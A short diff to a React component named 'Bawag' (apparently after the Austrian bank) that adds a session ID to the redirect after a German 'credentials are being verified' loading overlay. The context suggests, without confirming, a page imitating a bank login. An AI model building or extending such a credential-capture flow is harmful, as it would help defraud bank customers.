@@ -115,7 +115,7 @@ const Bawag = () => {
 
   return (
     <>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
     <div
       className="min-h-screen bg-white overflow-x-hidden flex justify-center"
       style={{
